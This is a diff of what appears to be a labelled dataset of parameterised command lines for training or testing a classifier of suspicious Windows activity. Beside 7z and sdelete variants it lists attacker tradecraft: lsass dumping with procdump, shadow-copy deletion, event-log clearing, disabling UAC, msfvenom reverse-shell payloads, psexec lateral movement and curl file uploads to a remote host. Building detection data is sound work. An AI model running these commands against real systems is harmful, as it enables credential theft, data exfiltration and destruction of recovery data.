@@ -1,128 +1,128 @@
-1	7z a -p ${destination_file_path} ${source_file_path}
-1	cmd /c "7z a -p ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z a -p ${destination_file_path} ${source_file_path}"
-1	7z.exe a -p ${destination_file_path} ${source_file_path}
-1	cmd /c "7z.exe a -p ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z.exe a -p ${destination_file_path} ${source_file_path}"
-1	7z a ${destination_file_path} ${source_file_path} -p
-1	cmd /c "7z a ${destination_file_path} ${source_file_path} -p"
-1	powershell -c "7z a ${destination_file_path} ${source_file_path} -p"
-1	7z.exe a ${destination_file_path} ${source_file_path} -p
-1	cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p"
-1	powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p"
-1	7z a -p${password} ${destination_file_path} ${source_file_path}
-1	cmd /c "7z a -p${password} ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z a -p${password} ${destination_file_path} ${source_file_path}"
-1	7z.exe a -p${password} ${destination_file_path} ${source_file_path}
-1	cmd /c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
-1	7z a ${destination_file_path} ${source_file_path} -p${password}
-1	cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
-1	powershell -c "7z a ${destination_file_path} ${source_file_path} -p${password}"
-1	7z.exe a ${destination_file_path} ${source_file_path} -p${password}
-1	cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
-1	powershell -c "7z.exe a ${destination_file_path} ${source_file_path} -p${password}"
-1	7z a -slp -p ${destination_file_path} ${source_file_path}
-1	cmd /c "7z a -slp -p ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z a -slp -p ${destination_file_path} ${source_file_path}"
-1	7z.exe a -slp -p ${destination_file_path} ${source_file_path}
-1	cmd /c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
-1	7z a -slp ${destination_file_path} ${source_file_path} -p
-1	cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p"
-1	powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
-1	7z.exe a -slp ${destination_file_path} ${source_file_path} -p
-1	cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
-1	powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
-1	7z a -slp -p${password} ${destination_file_path} ${source_file_path}
-1	cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
-1	7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
-1	cmd /c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
-1	7z a -slp ${destination_file_path} ${source_file_path} -p${password}
-1	cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
-1	powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
-1	7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}
-1	cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
-1	powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
-1	7z a -slt -p ${destination_file_path} ${source_file_path}
-1	cmd /c "7z a -slt -p ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z a -slt -p ${destination_file_path} ${source_file_path}"
-1	7z.exe a -slt -p ${destination_file_path} ${source_file_path}
-1	cmd /c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
-1	7z a -slt ${destination_file_path} ${source_file_path} -p
-1	cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p"
-1	powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p"
-1	7z.exe a -slt ${destination_file_path} ${source_file_path} -p
-1	cmd /c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-1	powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-1	7z a -slt -p${password} ${destination_file_path} ${source_file_path}
-1	cmd /c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
-1	powershell -c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
-1	7z.exe a -slt -p${password} ${destination_file_path} ${source_file_path}
-0	wmic.exe os get Caption,Version
-0	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	sdelete.exe -f -q ${local_file_path}
-0	nmap -sC ${ip_address} 2> /dev/null
-0	cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-0	cmd /c "certutil -encode -gmt -v error.txt encode.txt"
-0	cmd /c "procdump.exe -mm lsass.exe lsassdump.dmp"
-0	plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-0	nmap -p- -sV -O ${ip_address}
-0	powershell -c "ipconfig /allcompartments /all"
-0	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-0	powershell -c "netstat.exe -f"
-0	nmap -p- -sV -O ${ip_address} 2> error.log
-0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
-0	powershell -c "mstsc /v:${ip_address}"
-0	cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-0	cmd /c "wevtutil cl system"
-0	netstat.exe -f
-0	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-0	powershell -c "procdump -accepteula -ma lsass lsassdump.dmp"
-0	powershell -c "ipconfig /allcompartments /all"
-0	powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-0	taskkill /F /im ${process_name} /T
-0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
-0	cmd /c "wmic.exe os get SystemDevice"
-0	procdump -ma lsass.exe lsassdump.dmp
-0	nmap ${ip_address} 2> &1
-0	cmd /c "certutil -encode -v -f error.txt encode.txt"
-0	powershell -c "sdelete.exe -accepteula ${local_file_path}"
-0	powershell -c "ipconfig /allcompartments /all"
-0	cmd /c "hostname.exe"
-0	vssadmin.exe delete shadows /all /Quiet
-0	powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-0	procdump.exe -mm lsass lsassdump.dmp
-0	powershell -c "mstsc.exe /v:${ip_address} /f /remoteGuard"
-0	cmd /c "sdelete.exe -q -accepteula ${local_file_path}"
-0	ipconfig /all
-0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
-0	powershell -c "del /q ${local_file_path}"
-0	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
-0	choco install procdump
-0	cmd /c "taskkill.exe /F /IM ${process_name}"
-0	powershell -c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	cmd /c "netstat"
-0	cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
-0	powershell -c "mstsc /v:${ip_address} /f /multimon"
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	powershell -c "vssadmin delete shadows /all /quiet"
-0	choco install -y procdump
-0	msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	powershell -c "netstat.exe"
-0	powershell -c "taskkill.exe /f /im ${process_name} /T"
-0	cmd /c "mstsc.exe /v:${ip_address} /f"
-0	psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-0	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-0	powershell -c "wmic.exe os get Caption,Version"
-0	cmd /c "taskkill /F /im ${process_name}"
-0	wmic.exe shadowcopy call create Volume=C:
-0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-0	powershell -c "procdump.exe -ma lsass.exe lsassdump.dmp"
-0	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-0	powershell -c "vssadmin Delete Shadows /All"
+1	sdelete ${local_file_path}
+1	cmd /c "sdelete ${local_file_path}"
+1	powershell -c "sdelete ${local_file_path}"
+1	sdelete.exe ${local_file_path}
+1	cmd /c "sdelete.exe ${local_file_path}"
+1	powershell -c "sdelete.exe ${local_file_path}"
+1	sdelete -accepteula ${local_file_path}
+1	cmd /c "sdelete -accepteula ${local_file_path}"
+1	powershell -c "sdelete -accepteula ${local_file_path}"
+1	sdelete.exe -accepteula ${local_file_path}
+1	cmd /c "sdelete.exe -accepteula ${local_file_path}"
+1	powershell -c "sdelete.exe -accepteula ${local_file_path}"
+1	sdelete -q ${local_file_path}
+1	cmd /c "sdelete -q ${loal_file_path}"
+1	powershell -c "sdelete -q ${local_file_path}"
+1	sdelete.exe -q ${local_file_path}
+1	cmd /c "sdelete.exe -q ${local_file_path}"
+1	powershell -c "sdelete.exe -q ${local_file_path}"
+1	sdelete -q -accepteula ${local_file_path}
+1	cmd /c "sdelete -q -accepteula ${loal_file_path}"
+1	powershell -c "sdelete -q -accepteula ${local_file_path}"
+1	sdelete.exe -q -accepteula ${local_file_path}
+1	cmd /c "sdelete.exe -q -accepteula ${local_file_path}"
+1	powershell -c "sdelete.exe -q -accepteula ${local_file_path}"
+1	sdelete -s ${local_file_path}
+1	cmd /c "sdelete -s ${local_file_path}"
+1	powershell -c "sdelete -s ${local_file_path}"
+1	sdelete.exe -s ${local_file_path}
+1	cmd /c "sdelete.exe -s ${local_file_path}"
+1	powershell -c "sdelete.exe -s ${local_file_path}"
+1	sdelete -s -accepteula ${local_file_path}
+1	cmd /c "sdelete -s -accepteula ${local_file_path}"
+1	powershell -c "sdelete -s -accepteula ${local_file_path}"
+1	sdelete.exe -s -accepteula ${local_file_path}
+1	cmd /c "sdelete.exe -s -accepteula ${local_file_path}"
+1	powershell -c "sdelete.exe -s -accepteula ${local_file_path}"
+1	sdelete -s -q ${local_file_path}
+1	cmd /c "sdelete -s -q ${loal_file_path}"
+1	powershell -c "sdelete -s -q ${local_file_path}"
+1	sdelete.exe -s -q ${local_file_path}
+1	cmd /c "sdelete.exe -s -q ${local_file_path}"
+1	powershell -c "sdelete.exe -s -q ${local_file_path}"
+1	sdelete -s -q -accepteula ${local_file_path}
+1	cmd /c "sdelete -s -q -accepteula ${loal_file_path}"
+1	powershell -c "sdelete -s -q -accepteula ${local_file_path}"
+1	sdelete.exe -s -q -accepteula ${local_file_path}
+1	cmd /c "sdelete.exe -s -q -accepteula ${local_file_path}"
+1	powershell -c "sdelete.exe -s -q -accepteula ${local_file_path}"
+1	sdelete -f ${local_file_path}
+1	cmd /c "sdelete -f ${local_file_path}"
+1	powershell -c "sdelete -f ${local_file_path}"
+1	sdelete.exe -f ${local_file_path}
+1	cmd /c "sdelete.exe -f ${local_file_path}"
+1	powershell -c "sdelete.exe -f ${local_file_path}"
+1	sdelete -f -accepteula ${local_file_path}
+1	cmd /c "sdelete -f -accepteula ${local_file_path}"
+1	powershell -c "sdelete -f -accepteula ${local_file_path}"
+1	sdelete.exe -f -accepteula ${local_file_path}
+1	cmd /c "sdelete.exe -f -accepteula ${local_file_path}"
+1	powershell -c "sdelete.exe -f -accepteula ${local_file_path}"
+1	sdelete -f -q ${local_file_path}
+1	cmd /c "sdelete -f -q ${loal_file_path}"
+1	powershell -c "sdelete -f -q ${local_file_path}"
+1	sdelete.exe -f -q ${local_file_path}
+0	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+0	cmd /c "certutil -encode -Unicode -gmt error.txt encode.txt"
+0	cmd /c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
+0	powershell -c "choco install -y Megasync"
+0	powershell -c "netstat.exe -a"
+0	cmd /c "wmic os get TotalVirtualMemorySize"
+0	mstsc /v:${ip_address} /admin
+0	cmd /c "wmic os get Name"
+0	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+0	cmd /c "wmic.exe shadowcopy call create Volume=C:"
+0	cmd /c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	cmd /c "wmic /node:${ip_address} shadowcopy call create Volume=C:"
+0	rmdir /s ${local_file_path}
+0	msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	vssadmin Delete Shadows /All /Quiet
+0	cmd /c "mstsc.exe /v:${ip_address} /remoteGuard"
+0	powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
+0	powershell -c "wmic.exe /node:${ip_address} shadowcopy call create Volume=C:"
+0	wevtutil.exe cl system
+0	certutil -encode -Unicode -gmt -f error.txt encode.txt
+0	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
+0	powershell -c "del /f ${local_file_path}"
+0	powershell -c "vssadmin delete shadows /all /Quiet"
+0	choco install -y rclone
+0	powershell -c "mstsc /v:${ip_address} /restrictedAdmin"
+0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+0	taskkill /f /im ${process_name}
+0	nmap -p- -sC -sV -O ${ip_address} 2> /dev/null
+0	ipconfig /renew
+0	psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+0	plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	cmd /c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	7z.exe a -slt ${destination_file_path} ${source_file_path} -p
+0	cmd /c "procdump -ma lsass.exe lsassdump.dmp"
+0	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	powershell -c "7z a ${destination_file_path} ${source_file_path} -p"
+0	mstsc.exe /v:${ip_address} /f /multimon
+0	powershell -c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+0	7z a -p ${destination_file_path} ${source_file_path}
+0	curl.exe -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+0	cmd /c "procdump -ma lsass.exe lsassdump.dmp"
+0	cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+0	powershell -c "wmic os get OSArchitecture"
+0	powershell -c "mstsc /v:${ip_address} /admin"
+0	taskkill.exe /F /im ${process_name} /T
+0	certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt
+0	cmd /c "taskkill /f /IM ${process_name} /T"
+0	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+0	powershell -c "choco install -f rclone"
+0	powershell -c "vssadmin delete shadows /all"
+0	cmd /c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+0	nmap -p- -sC -sV -O -A ${ip_address} 2> error.log
+0	ssmtp ${username}@${domain} < mail.txt 2> error.log
+0	plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+0	procdump -mm lsass lsassdump.dmp
+0	powershell -c "choco install -f 7zip"
+0	powershell -c "wmic os get OSArchitecture"
+0	cmd /c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+0	powershell -c "procdump.exe -accepteula -ma lsass lsassdump.dmp"
+0	nmap -p- ${ip_address} 2> &1
+0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+0	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
